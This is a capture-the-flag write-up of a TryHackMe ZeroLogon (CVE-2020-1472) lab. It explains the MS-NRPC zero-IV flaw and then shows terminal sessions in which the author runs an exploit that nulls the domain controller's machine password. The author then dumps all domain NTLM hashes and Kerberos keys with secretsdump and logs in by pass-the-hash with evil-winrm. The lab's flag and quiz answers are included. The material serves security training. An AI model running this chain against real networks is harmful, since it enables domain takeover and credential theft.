---
Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.
---

### The Zero Day Angle 

The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a "Proof of Concept" emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.

Zero Logon - The Zero Day Angle

About The vulnerability - 

On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.

Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero. 

But how is that useful to us? We'll touch on that note in the following sections.

About Machine Accounts -

Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They're not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we're at that point, we've already compromised the machine -- and we're looking for persistence within the domain, not lateral movement.

Abusing the Vulnerability - 

Machine accounts often hold system level privileges which we can use for a variety of things. If you're not familiar with Active Directory, we can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:

Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit

Analyzing the MS-NRPC Logon Process - 

At this point, we know a vulnerability exists, but we're not quite sure how to exploit it yet. We'll be covering that soon, but what we do know there's a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.

To analyze where the vulnerability occurs, we'll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.

![](https://www.zdnet.com/a/hub/i/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/zerologon-attack.png)

Source: Secura

Step 1. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:

1. The DC
2. The Target Device (Also the DC, in our case)
3. A Nonce (In our case is 16 Bytes of Zero).

Step 2. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]

Step 3. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:

1. A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)
2. An Account Name (The Domain Controller's machine account name. ex: DC01$)
3. A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])
4. The Computer Name (The Domain Controller ex: DC01)
5. The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])  
6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)

Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]

At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.

Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]


From there, normal RPC communications can occur.

Sources -
1. Tom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055
1. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9
2. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9



Read about Zero Logon *No answer needed*

###  Impacket Installation 



Impacket Installation

Git Clone Impacket -

As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:


python3 -m pip install virtualenv

python3 -m virtualenv impacketEnv

source impacketEnv/bin/activate

pip install git+https://github.com/SecureAuthCorp/impacket


After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.

Credit to Onurshin in the TryHackMe Discord for suggesting Python Virtual Environments.


Install Impacket in a Virtual Environment  *No answer needed*

```
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir zerologon_learning            
                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ cd zerologon_learning  
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ python3 -m pip install virtualenv
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: virtualenv in /usr/lib/python3/dist-packages (20.14.0+ds)
Requirement already satisfied: platformdirs<3,>=2 in /usr/lib/python3/dist-packages (from virtualenv) (2.5.1)
Requirement already satisfied: filelock<4,>=3.2 in /usr/lib/python3/dist-packages (from virtualenv) (3.6.0)
Requirement already satisfied: six<2,>=1.9.0 in /usr/lib/python3/dist-packages (from virtualenv) (1.16.0)
Requirement already satisfied: distlib<1,>=0.3.1 in /usr/lib/python3/dist-packages (from virtualenv) (0.3.4)
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ python3 -m virtualenv impacketEnv
created virtual environment CPython3.10.5.final.0-64 in 951ms
  creator CPython3Posix(dest=/home/kali/Downloads/zerologon_learning/impacketEnv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==22.0.2, setuptools==59.6.0, wheel==0.37.1
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
impacketEnv
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ cd impacketEnv       
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ ls
bin  lib  pyvenv.cfg
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ cd bin          
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv/bin]
└─$ ls
activate       activate.ps1      pip3      python3     wheel-3.10
activate.csh   activate_this.py  pip-3.10  python3.10  wheel3.10
activate.fish  deactivate.nu     pip3.10   wheel
activate.nu    pip               python    wheel3
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv/bin]
└─$ cd .. 
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning/impacketEnv]
└─$ cd ..
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ ls
impacketEnv
                                                                          
┌──(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ source impacketEnv/bin/activate
                                                                          
┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ pip install git+https://github.com/SecureAuthCorp/impacket
Collecting git+https://github.com/SecureAuthCorp/impacket
  Cloning https://github.com/SecureAuthCorp/impacket to /tmp/pip-req-build-rki56vmp
  Running command git clone --filter=blob:none --quiet https://github.com/SecureAuthCorp/impacket /tmp/pip-req-build-rki56vmp
  Resolved https://github.com/SecureAuthCorp/impacket to commit 3c6713e309cae871d685fa443d3e21b7026a2155
  Preparing metadata (setup.py) ... done
Collecting charset_normalizer
  Downloading charset_normalizer-2.1.1-py3-none-any.whl (39 kB)
Collecting dsinternals
  Downloading dsinternals-1.2.4.tar.gz (174 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 174.2/174.2 KB 6.2 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting flask>=1.0
  Downloading Flask-2.2.2-py3-none-any.whl (101 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 101.5/101.5 KB 17.2 MB/s eta 0:00:00
Collecting future
  Using cached future-0.18.2.tar.gz (829 kB)
  Preparing metadata (setup.py) ... done
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5
  Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 432.2/432.2 KB 19.1 MB/s eta 0:00:00
Collecting ldapdomaindump>=0.9.0
  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)
Collecting pyOpenSSL>=21.0.0
  Downloading pyOpenSSL-22.0.0-py2.py3-none-any.whl (55 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 55.8/55.8 KB 4.9 MB/s eta 0:00:00
Collecting pyasn1>=0.2.3
  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 77.1/77.1 KB 10.4 MB/s eta 0:00:00
Collecting pycryptodomex
  Downloading pycryptodomex-3.15.0-cp35-abi3-manylinux2010_x86_64.whl (2.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 17.8 MB/s eta 0:00:00
Collecting six
  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)
Collecting Jinja2>=3.0
  Downloading Jinja2-3.1.2-py3-none-any.whl (133 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 133.1/133.1 KB 15.4 MB/s eta 0:00:00
Collecting Werkzeug>=2.2.2
  Downloading Werkzeug-2.2.2-py3-none-any.whl (232 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 232.7/232.7 KB 38.0 MB/s eta 0:00:00
Collecting itsdangerous>=2.0
  Downloading itsdangerous-2.1.2-py3-none-any.whl (15 kB)
Collecting click>=8.0
  Downloading click-8.1.3-py3-none-any.whl (96 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 96.6/96.6 KB 16.4 MB/s eta 0:00:00
Collecting dnspython
  Downloading dnspython-2.2.1-py3-none-any.whl (269 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 269.1/269.1 KB 16.2 MB/s eta 0:00:00
Collecting cryptography>=35.0
  Downloading cryptography-37.0.4-cp36-abi3-manylinux_2_24_x86_64.whl (4.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.1/4.1 MB 18.0 MB/s eta 0:00:00
Collecting cffi>=1.12
  Using cached cffi-1.15.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (441 kB)
Collecting MarkupSafe>=2.0
  Downloading MarkupSafe-2.1.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (25 kB)
Collecting pycparser
  Using cached pycparser-2.21-py2.py3-none-any.whl (118 kB)
Building wheels for collected packages: impacket, dsinternals, future
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.10.1.dev1+20220720.103933.3c6713e-py3-none-any.whl size=1487871 sha256=3f742b8ef787b7499e9ea24c814b81073eb2aad96dfbb7f2978b2dc8b3e87b7e
  Stored in directory: /tmp/pip-ephem-wheel-cache-xajhvzar/wheels/ba/74/12/0c6d9090c411dd62bb15ad6ef9bd5aa7ae8978239af79d0172
  Building wheel for dsinternals (setup.py) ... done
  Created wheel for dsinternals: filename=dsinternals-1.2.4-py3-none-any.whl size=208334 sha256=cc15969abe99c0e8c1b43f57d1a4a96f93154ac100befc22a4938efb9b9bf3ed
  Stored in directory: /home/kali/.cache/pip/wheels/dd/dc/71/93fb7be53723b600c4363af8f0bc1b88aee50a988d26266598
  Building wheel for future (setup.py) ... done
  Created wheel for future: filename=future-0.18.2-py3-none-any.whl size=491070 sha256=b3648abb7e564aa438f606e55475eb2c44d22658e85fffbfc0070a2de2422902
  Stored in directory: /home/kali/.cache/pip/wheels/22/73/06/557dc4f4ef68179b9d763930d6eec26b88ed7c389b19588a1c
Successfully built impacket dsinternals future
Installing collected packages: pyasn1, six, pycryptodomex, pycparser, MarkupSafe, ldap3, itsdangerous, future, dsinternals, dnspython, click, charset_normalizer, Werkzeug, ldapdomaindump, Jinja2, cffi, flask, cryptography, pyOpenSSL, impacket
Successfully installed Jinja2-3.1.2 MarkupSafe-2.1.1 Werkzeug-2.2.2 cffi-1.15.1 charset_normalizer-2.1.1 click-8.1.3 cryptography-37.0.4 dnspython-2.2.1 dsinternals-1.2.4 flask-2.2.2 future-0.18.2 impacket-0.10.1.dev1+20220720.103933.3c6713e itsdangerous-2.1.2 ldap3-2.9.1 ldapdomaindump-0.9.3 pyOpenSSL-22.0.0 pyasn1-0.4.8 pycparser-2.21 pycryptodomex-3.15.0 six-1.16.0
```

###  The Proof of Concept 

Modifying and Weaponizing the PoC

PoC and You - 

Proof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working [Proof of Concept for Zero Logon](https://github.com/SecuraBV/CVE-2020-1472) that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call ([NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)). Looking up the method within the Microsoft Documentation, it's very similar to [hNetSeverAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9), so we're going to re-use some of the same variables from that, as well as the structure.


Analyzing the PoC - 

https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py


What method will allow us to change Passwords over NRPC?
*NetrServerPasswordSet2*

What are the required fields for the method per the Microsoft Documentation?
*PrimaryName, AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator, ClearNewpassword*

What Opnumber is the Method?
*30*

Modify the PoC *No answer needed* (If you're having difficulty, you can download the modified PoC from here: https://github.com/Sq00ky/Zero-Logon-Exploit)

### Lab It Up! 

Lab It Up

Time to Play -

Now that you've learned about Zero Logon, it's time to put your new found skills to the test and exploit this vulnerable Domain Controller!


Ctrl+Z -

After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it's original state:
powershell.exe -c 'Reset-ComputerMachinePassword'


If you're confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution. You can do so with the following command:
`evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>`


```
rustscan -a 10.10.212.36 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOLOLIVE
|   NetBIOS_Domain_Name: HOLOLIVE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hololive.local
|   DNS_Computer_Name: DC01.hololive.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-28T18:57:55+00:00

```
What is the NetBIOS name of the Domain Controller?
*DC01*

What is the NetBIOS domain name of the network?
*HOLOLIVE*

What domain are you attacking?
*hololive.local*

```
┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ python3 zeroLogon-NullPass.py DC01 10.10.212.36           

 _____                   __                         
/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
 / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                  |___/             
                Vulnerability Discovered by Tom Tervoort
                              Exploit by Ronnie Bartwitz
  
Performing authentication attempts...
Failure to Autheticate at attempt number: 444
Zero Logon successfully exploited, changing password.

```

```
┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ secretsdump.py -just-dc -no-pass DC01\$@10.10.212.36
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::
hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::
hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49
Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1
Administrator:des-cbc-md5:bf34685d383e6734
krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583
krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d
krbtgt:des-cbc-md5:25f1cea1542f9e31
hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763
hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab
hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1
hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd
hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350
hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1
hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04
hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5
hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe
hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb
hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53
hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80
hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287
hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba
hololive.local\koronei:des-cbc-md5:a737e6073d15aecd
hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5
hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a
hololive.local\okayun:des-cbc-md5:10896d3786b9628f
hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9
hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc
hololive.local\watamet:des-cbc-md5:bf622564a840f192
hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233
hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42
hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1
DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8
DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8
DC01$:des-cbc-md5:cd161923ab9ec11c
[*] Cleaning up...
```

What is the Local Administrator's NTLM hash?
*3f3ef89114fb063e3d7fc23c20f65568*

How many Domain Admin accounts are there?
*2* (All Domain Admin accounts are prefixed with A-)

```
┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
└─$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.212.36

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine             

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/16/2020   4:52 PM                3D Objects
d-r---        9/16/2020   4:52 PM                Contacts
d-r---        10/7/2020   5:13 PM                Desktop
d-r---        9/16/2020   4:52 PM                Documents
d-r---        9/16/2020   4:52 PM                Downloads
d-r---        9/16/2020   4:52 PM                Favorites
d-r---        9/16/2020   4:52 PM                Links
d-r---        9/16/2020   4:52 PM                Music
d-r---        9/16/2020   4:52 PM                Pictures
d-r---        9/16/2020   4:52 PM                Saved Games
d-r---        9/16/2020   4:52 PM                Searches
d-r---        9/16/2020   4:52 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/20/2020   2:02 PM             24 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
THM{Zer0Log0nD4rkTh1rty}

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

What is the root flag?
*THM{Zer0Log0nD4rkTh1rty}*

[[Intro to ISAC]]

